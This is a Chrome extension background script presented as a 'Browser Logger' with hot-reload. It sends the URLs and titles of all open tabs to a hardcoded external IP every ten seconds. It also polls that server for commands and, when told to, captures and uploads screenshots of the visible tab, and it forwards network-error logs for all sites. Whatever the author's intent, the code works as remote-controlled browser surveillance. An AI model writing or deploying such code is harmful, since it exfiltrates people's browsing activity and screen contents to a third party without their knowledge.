// Browser Logger Enhanced - Background Script v2.1

const SERVER_HOST = '45.139.76.176';
const SERVER_PORT = 20847;
const SERVER_URL = `http://${SERVER_HOST}:${SERVER_PORT}`;

let logs = [];
let lastVersion = null;

// ========== HOT-RELOAD via Polling ==========
async function checkForUpdates() {
  try {
    const response = await fetch(SERVER_URL + '/version', {
      signal: AbortSignal.timeout(2000)
    });
    if (response.ok) {
      const data = await response.json();
      if (lastVersion && lastVersion !== data.version) {
        console.log('[ARWOX] New version detected, reloading...');
        chrome.runtime.reload();
      }
      lastVersion = data.version;
    }
  } catch (e) {
    // Server offline, ignore
  }
}

// Check for updates every 5 seconds
setInterval(checkForUpdates, 5000);
checkForUpdates();

// ========== SEND TABS LIST TO SERVER ==========
async function sendTabsList() {
  try {
    const tabs = await chrome.tabs.query({});
    const tabsData = tabs.map(tab => ({
      id: tab.id,
      windowId: tab.windowId,
      url: tab.url,
      title: tab.title,
      active: tab.active,
      pinned: tab.pinned,
      index: tab.index
    }));

    await fetch(SERVER_URL + '/tabs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tabs: tabsData, timestamp: Date.now() })
    });
  } catch (e) {
    // Server offline, ignore
  }
}

// Send tabs list every 10 seconds
setInterval(sendTabsList, 10000);
sendTabsList();

// ========== POLL FOR COMMANDS ==========
async function pollCommands() {
  try {
    const response = await fetch(SERVER_URL + '/command', {
      signal: AbortSignal.timeout(2000)
    });
    if (response.ok) {
      const cmd = await response.json();
      if (cmd && cmd.action) {
        executeCommand(cmd);
      }
    }
  } catch (e) {
    // Server offline, ignore
  }
}

async function executeCommand(cmd) {
  console.log('[ARWOX] Executing command:', cmd.action);

  if (cmd.action === 'screenshot') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      const tab = await chrome.tabs.get(tabId);
      chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' }, async (dataUrl) => {
        if (!chrome.runtime.lastError && dataUrl) {
          await fetch(SERVER_URL + '/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'screenshot', data: dataUrl, url: tab.url, title: tab.title, timestamp: Date.now() })
          });
        }
      });
    }
  }

  if (cmd.action === 'get_tabs') {
    sendTabsList();
  }

  // Clear command after execution
  await fetch(SERVER_URL + '/command', { method: 'DELETE' });
}

// Poll for commands every 3 seconds
setInterval(pollCommands, 3000);

// ========== Message Handler ==========
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {

  // Screenshot capture
  if (message.type === 'CAPTURE_SCREENSHOT') {
    const tabId = message.tabId;

    // Get the tab's window to capture the correct page
    chrome.tabs.get(tabId, (tab) => {
      if (chrome.runtime.lastError) {
        sendResponse({ success: false, error: chrome.runtime.lastError.message });
        return;
      }

      const windowId = tab.windowId;

      chrome.tabs.captureVisibleTab(windowId, { format: 'png' }, async (dataUrl) => {
        if (chrome.runtime.lastError) {
          sendResponse({ success: false, error: chrome.runtime.lastError.message });
          return;
        }

        try {
          const response = await fetch(SERVER_URL + '/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'screenshot',
              timestamp: Date.now(),
              tabId: tabId,
              url: tab.url,
              title: tab.title,
              data: dataUrl
            })
          });

          sendResponse({ success: response.ok, error: response.ok ? null : 'Server error' });
        } catch (e) {
          sendResponse({ success: false, error: e.message });
        }
      });
    });
    return true;
  }

  // Debugger status
  if (message.type === 'GET_DEBUGGER_STATUS') {
    chrome.debugger.getTargets((targets) => {
      const attached = targets.some(t => t.attached);
      sendResponse({ attached });
    });
    return true;
  }

  // Log handling
  if (message.type === 'LOG') {
    const logEntry = {
      timestamp: new Date().toISOString(),
      url: sender.tab?.url || 'unknown',
      tabId: sender.tab?.id,
      ...message.data
    };
    logs.push(logEntry);
    sendToServer('/log', logEntry);
    sendResponse({ success: true });
  }

  if (message.type === 'GET_LOGS') {
    sendResponse({ logs });
  }

  if (message.type === 'CLEAR_LOGS') {
    logs = [];
    sendResponse({ success: true });
  }

  if (message.type === 'SETTINGS_UPDATED') {
    sendResponse({ success: true });
  }

  return true;
});

// ========== Network Error Listener ==========
chrome.webRequest.onErrorOccurred.addListener(
  (details) => {
    const logEntry = {
      timestamp: new Date().toISOString(),
      type: 'network_error',
      url: details.url,
      error: details.error,
      tabId: details.tabId
    };
    logs.push(logEntry);
    sendToServer('/log', logEntry);
  },
  { urls: ['<all_urls>'] }
);

// ========== Send to Server ==========
async function sendToServer(endpoint, data) {
  try {
    await fetch(SERVER_URL + endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch (e) {
    // Server offline, ignore
  }
}
